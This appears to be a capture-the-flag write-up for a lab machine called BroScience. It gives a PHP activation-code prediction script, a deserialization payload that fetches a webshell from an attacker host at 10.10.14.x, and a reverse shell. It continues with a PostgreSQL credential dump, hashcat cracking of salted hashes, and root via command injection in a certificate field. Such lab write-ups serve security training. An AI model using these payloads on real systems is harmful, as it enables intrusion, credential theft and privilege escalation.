Let's try to read register.php

register.php loading generate_activation_code function from utils.php also found activation code parameter .

utils.php

It's easy to generate activation code .

Creating user and grabbing time

We need server's user created time to generate activation code .

Generating activation code

		
<?php
function generate_activation_code($time) {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand($time);
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

$time = date("U",strtotime('Tue, 10 Jan 2023 06:03:23 GMT'));
echo generate_activation_code($time);
?>

Activation code returned .

Checking code

Generated code worked .

utils.php

utils.php deserialize a base64 encoded cookie called user-prefs .

Avatar

Avatar using file_get_contents and fwrite we can use this to drop a shell .

php Deserialize Attack

		
<?php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp = "http://10.10.14./shell.php";
    public $imgPath = "./shell.php";

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

echo base64_encode(serialize(new AvatarInterface));
?>

Creating base64 encoded serialize payload and inject it into user-prefs cookie .

Webshell

Now we can execute command as www-data .

Reverseshell

Reverseshell returned .

register.php

From register.php found db_connect.php .

db_connect.php

Some creds for postgresql database, postgresql use port 5432 .

Dumping Database

		
psql -U dbuser -h localhost -d broscience -W
\dt
\d+ users
select username,password from users;
\q

Dumping username,password columns from users table .

Cracking hashes

		
hashcat hashes.txt -m 20 /usr/share/wordlists/rockyou.txt

Added salt from db_connect.php and use hashcat mode 20 to crack salted md5sum hashes .

ssh bill (user)

Cracked bill's hashed password worked with ssh.

Running enumL

Found renew_cert.sh under opt dir from This linux enumeration script .

renew_cert.sh

This script check for expire date of certificate that lives under /home/bill/Certs/ dir if cert expire soon it renew cert, this script getting cert fields to create a new cert which is vulnerable for command injection .

Who runs this?

Simple ps -ef command with bash while loop reveled this script is execute by root .

Creating malicious certificate

		
openssl req -x509 -nodes -days 1 -newkey rsa:2048 -keyout broscience.key -out broscience.crt

Common Name field is a good injection point .

Feed it root

After creating malicious cert we need to copy it to Certs dir under bill user .

Setuid (root)

Setuid trick worked again .
